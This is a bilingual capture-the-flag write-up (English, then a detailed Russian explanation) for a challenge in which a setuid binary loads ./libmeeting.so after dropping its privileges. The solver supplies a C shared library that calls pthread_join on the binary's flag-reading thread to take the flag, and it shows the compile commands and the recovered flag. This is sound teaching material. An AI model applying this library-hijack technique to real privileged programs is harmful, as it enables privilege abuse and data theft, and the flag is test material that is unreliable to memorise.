# needle

**Category** threadctf

## Solution

1. I connected to the challenge container via SSH.

   ```bash
   ssh a.kaiumova-needle@osctf.nnk.moe
   ```

2. I checked the working directory, listed the files, and inspected the executable.

   ```bash
   pwd
   ls -la
   file meeting
   ```

   The working directory was `/home/ctf`. The `meeting` executable was owned by root and had the setuid bit. `file` identified it as a dynamically linked, non-stripped, x86-64 Linux ELF executable.

   ```text
   meeting: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
   ```

3. I inspected the executable's symbol table to locate the thread identifier.

   ```bash
   nm meeting | grep retrieval
   ```

   Output:

   ```text
   0000000000404128 B retrieval
   ```

   The symbol `retrieval` is a global `pthread_t` variable in the BSS section. The challenge's `Meeting.c` creates the retrieval thread, waits until it has retrieved the flag, drops its elevated privileges, and then loads `./libmeeting.so`. Its own `pthread_join(retrieval, ...)` occurs later, after a delay. This gives the library's `meeting()` function an opportunity to join the retrieval thread first.

4. I created the source file for the shared library.

   ```bash
   nano meeting_hook.c
   ```

   I used the following code:

   ```c
   #define _GNU_SOURCE

   #include <dlfcn.h>
   #include <pthread.h>
   #include <stdio.h>

   void *meeting(void *arg) {
       (void)arg;

       pthread_t *retrieval_ptr =
           (pthread_t *)dlsym(RTLD_DEFAULT, "retrieval");

       if (retrieval_ptr == NULL) {
           fprintf(stderr, "retrieval symbol not found\n");
           return NULL;
       }

       void *flag = NULL;

       if (pthread_join(*retrieval_ptr, &flag) == 0 && flag != NULL) {
           printf("FLAG: %s\n", (char *)flag);
           fflush(stdout);
       } else {
           fprintf(stderr, "pthread_join failed\n");
       }

       return NULL;
   }
   ```

5. I compiled the library as a position-independent shared object and launched the challenge.

   ```bash
   gcc -shared -fPIC -Wall -Wextra -o libmeeting.so meeting_hook.c -ldl -pthread
   ./meeting
   ```

   Output:

   ```text
   FLAG: threadctf{5HOo7Ing_sOM3_At0m1c_f3et}

   The fabric is nowhere to be found! Polythread is very angry, so you'll have to stay out of faywild for a while.
   Thankfully, your name is still with you, so you are free to lose it another day.
   ```

   The flag was printed by my `meeting()` function. The subsequent message came from the original executable: its later attempt to join the same retrieval thread failed because the thread had already been joined.

## Подробный разбор

### 1. Подключение и проверка файлов

```bash
ssh a.kaiumova-needle@osctf.nnk.moe
pwd
ls -la
file meeting
```

- `ssh` — подключение к выделенному контейнеру задания.
- `pwd` — вывод текущего каталога (`/home/ctf`).
- `ls -la` — подробный список файлов, включая скрытые. В нём был исполняемый файл `meeting` с правами `-rwsr-xr-x`: буква `s` в правах владельца указывает на setuid.
- `file meeting` — определение формата исполняемого файла. Это 64-битный ELF для Linux, динамически слинкованный и не очищенный от обычной таблицы символов (`not stripped`).

Setuid позволяет исполняемому файлу работать с эффективными правами владельца. В исходном `Meeting.c` программа сначала запускает поток, читающий `/root/flag.txt`, а затем сбрасывает повышенные права с помощью `setgid(getgid())` и `setuid(getuid())`. Поэтому напрямую читать защищённый файл из нашей библиотеки не нужно: поток уже получил его содержимое.

### 2. Поиск идентификатора потока

```bash
nm meeting | grep retrieval
```

- `nm meeting` — вывод символов исполняемого файла.
- `|` — передача вывода `nm` на стандартный ввод `grep`.
- `grep retrieval` — отбор строк, содержащих имя `retrieval`.

Результат:

```text
0000000000404128 B retrieval
```

`retrieval` — глобальная переменная типа `pthread_t`. Буква `B` означает размещение в BSS (области неинициализированных глобальных/статических данных). Адрес в выводе `nm` сам по себе ещё не гарантирует доступность через `dlsym`, но в данном запуске разрешение символа сработало.

### 3. Почему срабатывает перехват результата потока

По `Meeting.c` последовательность следующая:

1. `pthread_create(&retrieval, NULL, retrieve_the_fabric, NULL)` запускает поток получения флага.
2. Поток выделяет память через `malloc(256)`, читает флаг из `/root/flag.txt` и возвращает указатель на выделенную память.
3. Основной поток дожидается сигнала об окончании чтения через `pthread_cond_wait` и `pthread_cond_signal`.
4. Программа сбрасывает привилегии, загружает `./libmeeting.so` через `dlopen` и получает функцию `meeting` через `dlsym`.
5. Наша функция `meeting()` вызывается в отдельном потоке **до** попытки основной программы вызвать `pthread_join(retrieval, ...)`.

`pthread_join()` позволяет одному потоку дождаться другого и получить возвращённый им указатель. Мы используем это, чтобы забрать результат `retrieval` первыми. Повторно присоединять уже присоединённый поток нельзя; поэтому оригинальная программа позже сообщает, что ткань исчезла.

### 4. Создание `meeting_hook.c`

```bash
nano meeting_hook.c
```

В редакторе был создан исходный код, приведённый в разделе **Solution**.

Ключевые части программы:

- `#define _GNU_SOURCE` — включает расширения GNU, необходимые для используемых объявлений.
- `<dlfcn.h>` — объявления `dlsym` и `RTLD_DEFAULT`.
- `<pthread.h>` — объявления `pthread_t` и `pthread_join`.
- `void *meeting(void *arg)` — сигнатура, соответствующая функции потока, которую ожидает `pthread_create`. `(void)arg` подавляет предупреждение о неиспользуемом аргументе.
- `dlsym(RTLD_DEFAULT, "retrieval")` — поиск адреса переменной `retrieval` в области поиска динамического загрузчика.
- `(pthread_t *)` — преобразование найденного адреса к указателю на идентификатор потока.
- `pthread_join(*retrieval_ptr, &flag)` — ожидание завершения потока и получение значения, которое он вернул.
- `(char *)flag` — интерпретация возвращённого указателя как строки C.
- `printf("FLAG: %s\n", ...)` — вывод найденного флага.
- `fflush(stdout)` — немедленная отправка буферизованного вывода в терминал.
- `return NULL` — корректное возвращаемое значение функции потока.

### 5. Компиляция библиотеки и запуск

```bash
gcc -shared -fPIC -Wall -Wextra -o libmeeting.so meeting_hook.c -ldl -pthread
./meeting
```

Параметры компиляции:

- `gcc` — компилятор C.
- `-shared` — создание разделяемой библиотеки `.so`, а не обычного исполняемого файла.
- `-fPIC` — генерация позиционно-независимого кода для динамической библиотеки.
- `-Wall -Wextra` — включение дополнительных предупреждений компилятора.
- `-o libmeeting.so` — имя выходной библиотеки, которое ожидает `dlopen("./libmeeting.so", RTLD_NOW)`.
- `meeting_hook.c` — исходный файл.
- `-ldl` — библиотека динамической загрузки (для `dlsym`; в современных glibc функции могут быть доступны и без отдельной линковки).
- `-pthread` — поддержка POSIX threads при компиляции и линковке.

Команда `./meeting` запускает исходную программу, которая сама загружает нашу библиотеку и вызывает её функцию `meeting()`.

Фактический результат:

```text
FLAG: threadctf{5HOo7Ing_sOM3_At0m1c_f3et}

The fabric is nowhere to be found! Polythread is very angry, so you'll have to stay out of faywild for a while.
Thankfully, your name is still with you, so you are free to lose it another day.
```

**Итог:** флаг получен не чтением защищённого файла напрямую, а через результат уже существующего потока с помощью `pthread_join()`.
